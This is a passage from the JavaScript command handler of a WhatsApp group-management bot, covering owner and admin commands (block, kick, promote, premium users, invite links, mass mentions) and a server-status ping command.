					if (res.data == 500) return replygcyuta('Full Group❗');
				})
			}
			break
			case 'leave': case 'leavegc': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				await Yuta.groupLeave(m.chat).then((res) => replygcyuta(jsonformat(res))).catch((err) => replygcyuta(jsonformat(err)))
			}
			break
			case 'blokir': case 'block': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				if (!text && !m.quoted) {
					replygcyuta(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await Yuta.updateBlockStatus(numbersOnly, 'block').then((a) => replygcyuta(mess.done)).catch((err) => replygcyuta('Fail!'))
				}
			}
			break
			case 'openblokir': case 'unblokir': case 'openblock': case 'unblock': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				if (!text && !m.quoted) {
					replygcyuta(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
					await Yuta.updateBlockStatus(numbersOnly, 'unblock').then((a) => replygcyuta(mess.done)).catch((err) => replygcyuta('Fail!'))
				}
			}
			break
			case 'listpc': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
				let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
				for (let i of anu) {
					let nama = store.messages[i].array[0].pushName
					teks += `${setv} *Name :* ${nama}\n${setv} *User :* @${i.split('@')[0]}\n${setv} *Chat :* https://wa.me/${i.split('@')[0]}\n\n=====================\n\n`
				}
				Yuta.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'listgc': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
				let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
				for (let i of anu) {
					let metadata = await Yuta.groupMetadata(i)
					teks += `${setv} *Name :* ${metadata.subject}\n${setv} *Admin :* ${metadata.owner ? `@${metadata.owner.split('@')[0]}` : '-' }\n${setv} *ID :* ${metadata.id}\n${setv} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${setv} *Member :* ${metadata.participants.length}\n\n=====================\n\n`
				}
				Yuta.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'creategc': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				if (!text) return replygcyuta(`Example:\n${prefix + command} *Gc Name*`)
				let group = await Yuta.groupCreate(q, [m.sender])
				let res = await Yuta.groupInviteCode(group.id)
				await Yuta.sendMessage(m.chat, { text: `*Link Group :* *https://chat.whatsapp.com/${res}*\n\n*Group Name :* *${q}*`, detectLink: true }, { quoted: m });
				await Yuta.groupParticipantsUpdate(group.id, [m.sender], 'promote')
				await Yuta.sendMessage(group.id, { text: 'Done' })
			}
			break
			case 'addpr': case 'addprem': case 'addpremium': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				if (!text) return replygcyuta(`Example:\n${prefix + command} @tag|time(s/m/h/d)`)
				let [teks1, teks2] = text.split`|`
				const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				const onWa = await Yuta.onWhatsApp(nmrnya)
				if (!onWa.length > 0) return replygcyuta('This number is not registered on WhatsApp!')
				if (teks2) {
					prem.addPremiumUser(nmrnya, teks2, premium);
					replygcyuta(`Success ${command} @${nmrnya.split('@')[0]} During ${teks2}`)
					global.db.data.users[nmrnya].limit = global.db.data.users[nmrnya].vip ? global.limit.vip : global.limit.premium
					global.db.data.users[nmrnya].uang = global.db.data.users[nmrnya].vip ? global.uang.vip : global.uang.premium
				} else {
					replygcyuta(`Enter the time!\nExample: ${prefix + command} @tag|time`)
				}
			}
			break
			case 'delpr': case 'delprem': case 'delpremium': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				if (!text) return replygcyuta(`Example:\n${prefix + command} @tag`)
				const nmrnya = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (prem.checkPremiumUser(nmrnya, premium)) {
					premium.splice(prem.getPremiumPosition(nmrnya, premium), 1);
					fs.writeFileSync('./database/premium.json', JSON.stringify(premium));
					replygcyuta(`Sukses ${command} @${nmrnya.split('@')[0]}`)
					global.db.data.users[nmrnya].limit = global.db.data.users[nmrnya].vip ? global.limit.vip : global.limit.free
					global.db.data.users[nmrnya].uang = global.db.data.users[nmrnya].vip ? global.uang.vip : global.uang.free
				} else {
					replygcyuta(`User @${nmrnya.split('@')[0]} Not Premium❗`)
				}
			}
			break
			case 'listpr': case 'listprem': case 'listpremium': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				let txt = `*------「 LIST PREMIUM 」------*\n\n`
				for (let userprem of premium) {
					txt += `➸ *Number*: @${userprem.id.split('@')[0]}\n➸ *Limit*: ${global.db.data.users[userprem.id].limit}\n➸ *Money*: ${global.db.data.users[userprem.id].uang.toLocaleString('id-ID')}\n➸ *Expired*: ${formatDate(userprem.expired)}\n\n`
				}
				replygcyuta(txt)
			}
			break
			
			// Group Menu
			case 'add': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin) return ("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ")
				if (!text && !m.quoted) {
					replygcyuta(`EXAMPLE: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					try {
						await Yuta.groupParticipantsUpdate(m.chat, [numbersOnly], 'add').then(async (res) =>{
							for (let i of res) {
								let invv = await Yuta.groupInviteCode(m.chat)
								if (i.status == 408) return replygcyuta('User Just Left This Group!')
								if (i.status == 401) return replygcyuta('User Blocked The Bot!')
								if (i.status == 409) return replygcyuta('User has joined!')
								if (i.status == 500) return replygcyuta('Group Full!')
								if (i.status == 403) {
									await Yuta.sendMessage(m.chat, { text: `@${numbersOnly.split('@')[0]} Cannot Be Added\n\nBecause Target Private\n\nInvitations will be sent to\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nVia Private Chat`, mentions: [numbersOnly] }, { quoted : m })
									await Yuta.sendMessage(`${numbersOnly ? numbersOnly : '6285752535878@s.whatsapp.net'}`, { text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin: wa.me/${m.sender}\nInvite you to this group\nPlease enter if you wish🙇`, detectLink: true, mentions: [numbersOnly] }, { quoted : floc2 }).catch((err) => replygcyuta('Failed to Send Invitation!'))
								} else {
									replygcyuta('Success!!')
								}
							}
						})
					} catch (e) {
						replygcyuta('Failed to Add User')
					}
				}
			}
			break
			case 'kick': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin) return ("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ")
				if (!text && !m.quoted) {
					replygcyuta(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await Yuta.groupParticipantsUpdate(m.chat, [numbersOnly], 'remove').catch((err) => replygcyuta('Failed to Kick User!'))
				}
			}
			break
			case 'promote': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin) return ("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ")
				if (!text && !m.quoted) {
					replygcyuta(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await Yuta.groupParticipantsUpdate(m.chat, [numbersOnly], 'promote').catch((err) => replygcyuta('Fail!'))
					replygcyuta(mess.done)
				}
			}
			break
			case 'demote': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin) return ("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ")
				if (!text && !m.quoted) {
					replygcyuta(`Example: ${prefix + command} 91xxx`)
				} else {
					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
					await Yuta.groupParticipantsUpdate(m.chat, [numbersOnly], 'demote').catch((err) => replygcyuta('Failed!'))
					replygcyuta(mess.done)
				}
			}
			break
			case 'setnamegc': case 'setsubject': case 'setname': case 'setnamegc': case 'setsubject': case 'setsubjectgc': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin) return ("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ")
				if (!text && !m.quoted) {
					replygcyuta(`Example: ${prefix + command} text`)
				} else {
					const teksnya = text ? text : m.quoted.text
					await Yuta.groupUpdateSubject(m.chat, teksnya).catch((err) => replygcyuta('Fail!'))
				}
			}
			break
			case 'setdesc': case 'setdescgc': case 'setdesk': case 'setdeskgc': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin) return ("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ")
				if (!text && !m.quoted) {
					replygcyuta(`Example: ${prefix + command} textnya`)
				} else {
					const teksnya = text ? text : m.quoted.text
					await Yuta.groupUpdateDescription(m.chat, teksnya).catch((err) => replygcyuta('Fail!'))
				}
			}
			break
			case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
                if (!isAdmin) return replygcyuta(mess.admin)
                if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
                if (!quoted) return replygcyuta(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcyuta(`Send/Reply Image Caption Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcyuta(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await Yuta.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await Yuta.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcyuta(mess.done)
                } else {
                    var memeg = await Yuta.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcyuta(mess.done)
                }
                break
			case 'delete': case 'del': case 'd': {
				if (!m.quoted) return replygcyuta('Reply to the message you want to delete')
				await Yuta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: isBotAdmin ? false : true, id: m.quoted.id, participant: m.quoted.sender }})
			}
			break
			case 'linkgroup': case 'linkgrup': case 'linkgc': case 'urlgroup': case 'urlgrup': case 'urlgc': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin) return ("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ")
				let response = await Yuta.groupInviteCode(m.chat)
				await Yuta.sendMessage(m.chat, { text: `https://chat.whatsapp.com/${response}\n\nLink Group : ${(await Yuta.groupMetadata(m.chat)).subject}`, detectLink: true }, { quoted: m });
			}
			break
			case 'resetlink': case 'revoke': case 'newlink': case 'newurl': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin) return ("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ")
				await Yuta.groupRevokeInvite(m.chat).then((a) => {
					replygcyuta(`Reset Success, Group Invite Link ${m.metadata.subject}`)
				}).catch((err) => replygcyuta('Fail!'))
			}
			break
			case 'group': case 'grup': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin) return ("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ")
				if (text === 'close') {
					await Yuta.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcyuta(`*Successfully Closing The Group*`))
				} else if (text === 'open') {
					await Yuta.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcyuta(`*Successfully Opening The Group*`))
				} else {
					let button = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'SELECT',
							sections: [{
								title: 'Group Mode',
								rows: [
									{ title: 'Open Group', description: 'Open Group', id: 'grup open' },
									{ title: 'Close Group', description: 'Close Group', id: 'grup close' },
								]
							}]
						}
					}]
					await Yuta.sendButtonMsg(m.chat, 'Group Mode', ucpv2, 'Please choose', null, button, m);
				}
			}
			break
			case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
if (!isBotAdmin) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
    await Yuta.removeProfilePicture(m.chat)
    }
    break
    case 'deleteppbot': case 'delbotpp': case 'delppbot': {
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
    await Yuta.removeProfilePicture(Yuta.user.id)
    replygcyuta(`Success in deleting bot's profile picture`)
    }
    break
			case 'antidelete': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin) return ("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ")
				if (text === 'on') {
					if (db.data.groups[m.chat].antidelete) return replygcyuta('*Sudah Aktif Sebelumnya*')
					db.data.groups[m.chat].antidelete = true
					replygcyuta('*Anti Delete Activated !*')
				} else if (text === 'off') {
					db.data.groups[m.chat].antidelete = false
					replygcyuta('*Anti Delete Disabled !*')
				} else {
					let buttonnya = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'Pilih',
							sections: [{
								title: 'Anti Delete',
								rows: [
									{ title: 'ENABLE', description: 'Enable Antidelete', id: 'antidelete on' },
									{ title: 'DISABLE', description: 'Disable Antidelete', id: 'antidelete off' },
								]
							}]
						}
					}]
					await Yuta.sendButtonMsg(m.chat, 'Group Mode', ucpv2, 'Please choose', null, buttonnya, m);
				}
			}
			break
			case 'tagall': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin) return ("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ")
				let teks = `*Tag All*\n\n*Message :* ${q ? q : ''}\n\n`
				for (let mem of participants) {
					teks += `${setv} @${mem.id.split('@')[0]}\n`
				}
				await Yuta.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
			}
			break
			case 'hidetag': case 'h': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				Yuta.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
			}
			break
			case 'totag': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!m.quoted) return replygcyuta(`Reply messages with captions ${prefix + command}`)
				delete m.quoted.chat
				await Yuta.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
			}
			break
case 'ev': {
if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
Yuta.sendMessage(m.chat, {
  text: `@${m.chat} ${text}`,
  contextInfo: {
    groupMentions: [
      {
        groupSubject: "everyone",
        groupJid: m.chat,
      },
    ],
  },
});
}
break
			case 'listonline': case 'liston': {
				if (!m.isGroup) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				if (!isAdmin && !YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴀᴅᴍɪɴ*")
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				let online = [...Object.keys(store.presences[id]), botNumber]
				await Yuta.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `${setv} @` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => replygcyuta('Fail'))
			}
			break
			
			// Bot Menu
case 'owner': {
Yuta.sendMessage(from, {
contacts: {
displayName: `${list.length} Contact`,
contacts: list
}, contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: botname,
body: ownername,
thumbnail: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'),
sourceUrl: `https://whatsapp.com/channel/0029VadFS3r89inc7Jjus03W`,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, { quoted: fnews })
}
break
			case 'profile': case 'cekme': case 'cek': {
				const user = Object.keys(global.db.data.users)
				const infoUser = global.db.data.users[m.sender]
				const teks = `*Profile @${m.sender.split('@')[0]}* :\nUser Bot : ${user.includes(m.sender) ? 'True' : 'False'}\nUser : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}\nLimit : ${infoUser.limit}\nMoney : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`
				await Yuta.sendTextMentions(m.chat, teks, m)
			}
			break
			case 'req': case 'request': {
				if (!text) return replygcyuta('What do you want to request from the owner??')
				await Yuta.sendMessage(m.chat, { text: `*Request Has Been Sent To Owner*\n_Thank You🙏_` }, { quoted: m })
				await Yuta.sendFromOwner(ownernumber, `Order From : @${m.sender.split('@')[0]}\nFor Owners\n\nRequest ${text}`, m, { contextInfo: { mentionedJid: [m.sender], isForwarded: true }})
			}
			break
			case 'daily': case 'claim': {
				daily(Yuta, m, global.db.data.users)
			}
			break
			case 'transferlimit': case 'tflimit': case 'tlimit': {
				transferLimit(Yuta, m, args, global.db.data.users)
			}
			break
			case 'transfermoney': case 'tmoney': case 'transfer': {
				transferUang(Yuta, m, args, global.db.data.users)
			}
			break
			case 'buy': {
				buy(m, args, db)
			}
			break
			case 'react': {
				Yuta.sendMessage(m.chat, { react: { text: args[0], key: m.quoted ? m.quoted.key : m.key }})
			}
			break
			case 'tagme': {
				Yuta.sendMessage(m.chat, { text: `@${m.sender.split('@')[0]}`, mentions: [m.sender] }, { quoted: m })
			}
			break
			
case 'ping': case 'botstatus': case 'statusbot': {
  let muptime1;
  if (process.send) {
    process.send("uptime");
    muptime1 =
      (await new Promise((resolve) => {
        process.once("message", resolve);
        setTimeout(resolve, 1000);
      })) * 1000;
  }
  let muptime = clockString(muptime1);

  const used = process.memoryUsage()
  const cpus = os.cpus().map(cpu => {
    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
    return cpu
  })
  const cpu = cpus.reduce((last, cpu, _, { length }) => {
    last.total += cpu.total
    last.speed += cpu.speed / length
    last.times.user += cpu.times.user
    last.times.nice += cpu.times.nice
    last.times.sys += cpu.times.sys
    last.times.idle += cpu.times.idle
    last.times.irq += cpu.times.irq
    return last
  }, {
    speed: 0,
    total: 0,
    times: {
      user: 0,
      nice: 0,
      sys: 0,
      idle: 0,
      irq: 0
    }
  })
let timestamp = speed()
let latensi = speed() - timestamp
let neww = performance.now()
let oldd = performance.now()
let ping = neww - oldd

    let dy9 = new Date(new Date + 3600000)
    let locale = 'id'
    let weeks9 = dy9.toLocaleDateString(locale, {
        weekday: 'long'
    })
    let dates9 = dy9.toLocaleDateString(locale, {
        day: 'numeric',
        month: 'long',
        year: 'numeric'
    })
    let times9 = dy9.toLocaleTimeString(locale, {
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric'
    })
let NotDetect = 'Not Detect'
let netsIn, netsOut
await osu.netstat.inOut().then(info => {
  netsIn = (info.total.inputMb + ' MB'),
  netsOut = (info.total.outputMb + ' MB')
}).catch(() => {
  netsIn = NotDetect,
  netsOut = NotDetect
})
let driveTotal, driveUsed, drivePer
await osu.drive.info().then(info => {
  driveTotal = (info.totalGb + ' GB'),
  driveUsed = info.usedGb,
  drivePer = (info.usedPercentage + '%')
}).catch(() => {
  driveTotal = NotDetect,
  driveUsed = NotDetect,
  drivePer = NotDetect
})

respon = `- *ʀ ᴜ ɴ ᴛ ɪ ᴍ ᴇ* -
 〆 sᴇʀᴠᴇʀ: ${runtime(os.uptime())}
 〆 ᴘᴀɴᴇʟ: ${muptime}
 〆 ʙᴏᴛ: ${runtime(process.uptime())}
${readmore}

- *s ᴘ ᴇ ᴇ ᴅ* -
 〆 ${latensi} ᴅᴇᴛɪᴋ
 〆 ${oldd} ᴍɪʟɪᴅᴇᴛɪᴋ
sᴘᴇsɪғɪᴋᴀsɪ ${readmore}

- *ɪ ɴ ғ ᴏ - s ᴇ ʀ ᴠ ᴇ ʀ* -
 〆 *sᴇʀᴠᴇʀ:* ${os.hostname()}
 〆 *ᴄᴘᴜ ᴍᴏᴅᴇʟ:* ${osu.cpu.model()}
 〆 *ᴄᴘᴜ ᴄᴏʀᴇ:* ${osu.cpu.count()} Core
 〆 *ᴄᴘᴜ sᴘᴇᴇᴅ:* ${cpu.speed} MHZ
 〆 *ᴘʟᴀᴛғᴏʀᴍ:* ${os.platform()}
 〆 *ᴀʀᴄʜɪᴛᴇᴄᴛᴜʀᴇ:* ${os.arch()}
 〆 *ᴏs:* ${osu.os.platform()}
 〆 *ʀᴀᴍ:* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
 〆 *ᴛɪᴍᴇ sᴇʀᴠᴇʀ:* ${times9}
 〆 *ʜᴀʀɪ:* ${weeks9}
 〆 *ᴛᴀɴɢɢᴀʟ:* ${dates9}
 〆 *ᴅʀɪᴠᴇ ᴛᴏᴛᴀʟ:* ${driveTotal} GB
 〆 *ᴅʀɪᴠᴇ ᴜsᴇᴅ:* ${driveUsed} GB
 〆 *ᴅʀɪᴠᴇ ᴘᴇʀᴄ:* ${drivePer}

- *${cpus[0] ? `ᴛ ᴏ ᴛ ᴀ ʟ - ᴄ ᴘ ᴜ - ᴜ s ᴀ ɢ ᴇ* -
${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
ᴄᴘᴜ ᴄᴏʀᴇ(s) ᴜsᴀɢᴇ (${cpus.length} ᴄᴏʀᴇ ᴄᴘᴜ)

- *ɴ ᴏ ᴅ ᴇ ᴊ s - ᴍ ᴇ ᴍ ᴏ ʀ ʏ - ᴜ s ᴀ ɢ ᴇ* -
${Object.keys(used).map((key, _, arr) => `- ${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

- *ᴄ ᴘ ᴜ - ᴄ ᴏ ʀ ᴇ* -
${readmore}
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} ᴍʜᴢ) ]\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
let leo = {
  text: respon,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
